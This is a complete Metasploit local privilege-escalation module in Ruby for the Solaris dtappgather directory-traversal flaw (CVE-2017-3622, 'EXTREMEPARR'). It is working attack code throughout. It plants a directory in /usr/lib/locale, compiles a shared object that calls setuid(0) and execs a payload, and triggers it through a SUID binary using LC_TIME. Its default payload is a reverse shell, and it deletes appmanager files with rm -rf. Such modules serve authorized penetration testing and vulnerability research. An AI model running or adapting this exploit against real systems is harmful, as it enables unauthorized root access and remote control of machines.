# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Solaris::Priv
  include Msf::Post::Solaris::System
  include Msf::Post::Solaris::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "Solaris &#039;EXTREMEPARR&#039; dtappgather Privilege Escalation",
      &#039;Description&#039;    => %q{
        This module exploits a directory traversal vulnerability in the
        `dtappgather` executable included with Common Desktop Environment (CDE)
        on unpatched Solaris systems prior to Solaris 10u11 which allows users
        to gain root privileges.

        dtappgather allows users to create a user-owned directory at any
        location on the filesystem using the `DTUSERSESSION` environment
        variable.

        This module creates a directory in `/usr/lib/locale`, writes a shared
        object to the directory, and runs the specified SUID binary with the
        shared object loaded using the `LC_TIME` environment variable.

        This module has been tested successfully on:

        Solaris 9u7 (09/04) (x86);
        Solaris 10u1 (01/06) (x86);
        Solaris 10u2 (06/06) (x86);
        Solaris 10u4 (08/07) (x86);
        Solaris 10u8 (10/09) (x86);
        Solaris 10u9 (09/10) (x86).
      },
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;97774&#039;],
          [&#039;CVE&#039;, &#039;2017-3622&#039;],
          [&#039;EDB&#039;, &#039;41871&#039;],
          [&#039;URL&#039;, &#039;https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh&#039;],
          [&#039;URL&#039;, &#039;http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html&#039;]
        ],
      &#039;Notes&#039;          => { &#039;AKA&#039; => [&#039;EXTREMEPARR&#039;] },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Shadow Brokers&#039;,   # exploit
          &#039;Hacker Fantastic&#039;, # dtappgather-poc.sh
          &#039;Brendan Coles&#039;     # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 24 2017&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;solaris&#039;, &#039;unix&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64, ARCH_SPARC],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PAYLOAD&#039;     => &#039;solaris/x86/shell_reverse_tcp&#039;,
          &#039;WfsDelay&#039;    => 10,
          &#039;PrependFork&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      # Some useful example SUID executables:
      # * /usr/bin/at
      # * /usr/bin/cancel
      # * /usr/bin/chkey
      # * /usr/bin/lp
      # * /usr/bin/lpset
      # * /usr/bin/lpstat
      # * /usr/lib/lp/bin/netpr
      # * /usr/sbin/lpmove
      OptString.new(&#039;SUID_PATH&#039;, [true, &#039;Path to suid executable&#039;, &#039;/usr/bin/at&#039;]),
      OptString.new(&#039;DTAPPGATHER_PATH&#039;, [true, &#039;Path to dtappgather executable&#039;, &#039;/usr/dt/bin/dtappgather&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def suid_bin_path
    datastore[&#039;SUID_PATH&#039;]
  end

  def dtappgather_path
    datastore[&#039;DTAPPGATHER_PATH&#039;]
  end

  def mkdir(path)
    vprint_status "Creating directory &#039;#{path}&#039;"
    cmd_exec "mkdir -p &#039;#{path}&#039;"
    register_dir_for_cleanup path
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    output = cmd_exec "PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin gcc -fPIC -shared -g -lc -o #{path} #{path}.c"
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
  end

  def symlink(link_target, link_name)
    vprint_status "Symlinking #{link_target} to #{link_name}"
    rm_f link_name
    cmd_exec "ln -sf #{link_target} #{link_name}"
    register_file_for_cleanup link_name
  end

  def check
    [dtappgather_path, suid_bin_path].each do |path|
      unless setuid? path
        vprint_error "#{path} is not setuid"
        return CheckCode::Safe
      end
      vprint_good "#{path} is setuid"
    end

    unless has_gcc?
      vprint_error &#039;gcc is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;gcc is installed&#039;

    version = kernel_release
    if version.to_s.eql? &#039;&#039;
      vprint_error &#039;Could not determine Solaris version&#039;
      return CheckCode::Detected
    end

    unless Gem::Version.new(version).between? Gem::Version.new(&#039;5.7&#039;), Gem::Version.new(&#039;5.10&#039;)
      vprint_error "Solaris version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Solaris version #{version} appears to be vulnerable"

    CheckCode::Appears
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    unless writable? datastore[&#039;WritableDir&#039;]
      fail_with Failure::BadConfig, "#{datastore[&#039;WritableDir&#039;]} is not writable"
    end

    # Remove appmanager directory and contents
    appmanager_path = &#039;/var/dt/appconfig/appmanager&#039;
    vprint_status "Cleaning appmanager directory #{appmanager_path}"
    cmd_exec "chmod -R 755 #{appmanager_path}/*"
    cmd_exec "rm -rf #{appmanager_path}/*"
    rm_f appmanager_path

    # Create writable directory in /usr/lib/locale
    locale_path = &#039;/usr/lib/locale&#039;
    locale_name = rand_text_alphanumeric 5..10
    new_dir = "#{locale_path}/#{locale_name}"
    vprint_status "Creating directory #{new_dir}"
    depth = 3
    cmd_exec "DTUSERSESSION=. /usr/dt/bin/dtappgather"
    depth.times do
      cmd_exec "DTUSERSESSION=.. /usr/dt/bin/dtappgather"
    end
    symlink locale_path, appmanager_path
    cmd_exec "DTUSERSESSION=#{locale_name} #{dtappgather_path}"
    unless cmd_exec("ls -al #{locale_path} | grep #{locale_name}").to_s.include? locale_name
      fail_with Failure::NotVulnerable, "Could not create directory #{new_dir}"
    end

    print_good "Created directory #{new_dir}"
    register_dir_for_cleanup new_dir

    rm_f appmanager_path
    cmd_exec "chmod 755 #{new_dir}"

    # Upload and compile shared object
    base_path = "#{datastore[&#039;WritableDir&#039;]}/.#{rand_text_alphanumeric 5..10}"
    mkdir base_path

    payload_name = ".#{rand_text_alphanumeric 5..10}"
    payload_path = "#{base_path}/#{payload_name}"

    so = <<-EOF
      void __attribute__((constructor)) cons() {
        setuid(0);
        setgid(0);
        execle("#{payload_path}", "", 0, 0);
        _exit(0);
      }
    EOF

    so_name = ".#{rand_text_alphanumeric 5..10}"
    so_path = "#{base_path}/#{so_name}"
    upload_and_compile so_path, so

    vprint_status "Writing shared objects to #{new_dir}"
    cmd_exec "cp &#039;#{so_path}&#039; &#039;#{new_dir}/#{locale_name}.so.2&#039;"
    register_file_for_cleanup "#{new_dir}/#{locale_name}.so.2"
    cmd_exec "cp &#039;#{so_path}&#039; &#039;#{new_dir}/#{locale_name}.so.3&#039;"
    register_file_for_cleanup "#{new_dir}/#{locale_name}.so.3"

    # Upload and execute payload
    upload payload_path, generate_payload_exe
    cmd_exec "chmod +x #{payload_path}"

    print_status &#039;Executing payload...&#039;
    cmd_exec "LC_TIME=#{locale_name} #{suid_bin_path} & echo "
  end
end

